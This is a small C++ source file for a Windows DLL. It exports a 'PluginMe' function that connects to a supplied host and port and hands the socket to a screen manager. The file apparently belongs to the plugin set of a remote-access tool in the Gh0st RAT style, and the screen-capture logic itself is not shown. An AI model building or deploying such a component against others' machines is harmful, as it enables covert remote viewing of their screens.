#include "StdAfx.h"
#include "ClientSocket.h"
#include "MyScreenManager.h"

extern "C" __declspec(dllexport) BOOL PluginMe(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;

	CMyScreenManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

BOOL APIENTRY DllMain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	return TRUE;
}

